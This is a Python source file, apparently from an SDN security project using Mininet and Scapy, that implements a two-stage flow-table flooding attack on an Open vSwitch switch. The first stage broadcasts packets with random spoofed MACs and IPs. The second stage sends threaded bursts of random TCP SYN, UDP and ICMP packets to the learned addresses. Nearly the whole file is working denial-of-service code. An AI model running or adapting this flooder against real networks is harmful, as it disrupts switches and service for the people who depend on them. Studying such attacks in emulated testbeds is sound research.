import random
import queue
import argparse
import time

from typing import List
from threading import Thread, Event

from mininet.node import OVSSwitch, Intf

from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, Packet, sendp,
    fuzz, RandIP, RandMAC, RandChoice, RandShort
)

class FloodAttack:

    def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, threads: int, bsize: int, bdelay: int):
        self.switch = switch
        self.iface = iface
        self.npacket = npacket
        self.threads = threads
        self.bsize = bsize
        self.bdelay = bdelay
        self.macs: List[str] = []
        self._attack_thread: Thread = None
        self._stop_event: Event = Event()
        print("""
---------------------------------------------------------------------------------------------------------------------------------------------------

███████ ██       ██████  ██     ██     ████████  █████  ██████  ██      ███████     ███████ ██       ██████   ██████  ██████  ██ ███    ██  ██████  
██      ██      ██    ██ ██     ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██ ████   ██ ██       
█████   ██      ██    ██ ██  █  ██        ██    ███████ ██████  ██      █████       █████   ██      ██    ██ ██    ██ ██   ██ ██ ██ ██  ██ ██   ███ 
██      ██      ██    ██ ██ ███ ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██  ██ ██ ██    ██ 
██      ███████  ██████   ███ ███         ██    ██   ██ ██████  ███████ ███████     ██      ███████  ██████   ██████  ██████  ██ ██   ████  ██████ 

----------------------------------------------------------------------------------------------------------------------------------------------------
""")
        print("[+] Switch: {}\n[+] IFace: {}\n".format(self.switch.name, self.iface.name))

    @staticmethod
    def random_mac() -> str:
        return str(RandMAC())

    @staticmethod
    def random_ip() -> str:
        return str(RandIP())

    @staticmethod
    def random_port() -> int:
        return random.randint(1024, 65535)

    SUPPORTED_PROTOS = ["TCP", "UDP", "ICMP"]

    @staticmethod
    def random_proto() -> str:
        return random.choice(FloodAttack.SUPPORTED_PROTOS)

    @staticmethod
    def build_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> Packet:

        eth = Ether(src=src_mac, dst=dst_mac)
        ip  = IP(src=src_ip, dst=dst_ip)

        proto = FloodAttack.random_proto()

        if proto == "TCP":
            transport = TCP(
                sport=FloodAttack.random_port(),
                dport=FloodAttack.random_port(),
                flags="S"
            )
        elif proto == "UDP":
            transport = UDP(
                sport=FloodAttack.random_port(),
                dport=FloodAttack.random_port()
            )
        elif proto == "ICMP":
            transport = ICMP(
                type=random.choice([0, 8]),   # 0 = reply, 8 = echo request
                code=0
            )

        return eth / ip / transport

    def send_packets(self, packets: List[Packet]):
        """Invia i pacchetti in burst tramite worker thread, rispettando _stop_event."""
        def _worker(q: queue.Queue, delay: int):
            while not self._stop_event.is_set():
                try:
                    chunk = q.get(block=False)
                except queue.Empty:
                    return
                try:
                    sendp(chunk, iface=self.iface.name, verbose=False)
                    deadline = time.time() + delay
                    while time.time() < deadline:
                        if self._stop_event.is_set():
                            return
                        time.sleep(0.1)
                finally:
                    q.task_done()

        q: queue.Queue = queue.Queue()
        for i in range(0, len(packets), self.bsize):
            q.put(packets[i:i + self.bsize])
            #print(f"* Burst[{i}]={len(packets[i:i + self.bsize])}")

        n_workers = min(self.threads, q.qsize())
        workers = []
        for _ in range(n_workers):
            t = Thread(target=_worker, args=(q, self.bdelay), daemon=True)
            t.start()
            workers.append(t)
        q.join()

    def stage_1(self) -> None:
        if self._stop_event.is_set():
            return
        packets: List[Packet] = []
        print("[*] Crafting")
        for _ in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
            self.macs.append(src_mac)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        self.send_packets(packets)
        print("[*] Sent")

    def stage_2(self) -> None:
        if self._stop_event.is_set():
            return
        local_pool = self.macs.copy()
        random.shuffle(local_pool)
        packets: List[Packet] = []
        print("[*] Crafting")
        for i in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            dst_mac = local_pool[i % len(local_pool)]
            dst_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, dst_mac, dst_ip)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        self.send_packets(packets)
        print("[*] Sent")

    def _run(self):
        """Corpo dell'attacco eseguito nel thread interno."""
        print("# [STAGE 1] MAC Presenting")
        self.stage_1()
        if self._stop_event.is_set():
            print("[!] Attacco interrotto dopo stage 1.")
            return
        print()
        print("# [STAGE 2] Flooding")
        self.stage_2()
        print("[+] Attacco completato.")

    def start(self) -> None:
        self._stop_event.clear()
        self._attack_thread = Thread(target=self._run, name="flood-attack", daemon=True)
        self._attack_thread.start()

    def stop(self) -> None:
        """Segnala ai worker di fermarsi e attende la fine del thread."""
        self._stop_event.set()
        if self._attack_thread and self._attack_thread.is_alive():
            self._attack_thread.join(timeout=10)
            if self._attack_thread.is_alive():
                print("[!] Timeout: il thread di attacco non si è fermato.")
            else:
                print("[+] Thread di attacco terminato.")

    def is_running(self) -> bool:
        """True se il thread di attacco è ancora attivo."""
        return self._attack_thread is not None and self._attack_thread.is_alive()

    def join(self, timeout: float = None) -> None:
        """Attende la fine naturale dell'attacco (senza fermarlo)."""
        if self._attack_thread:
            self._attack_thread.join(timeout=timeout)

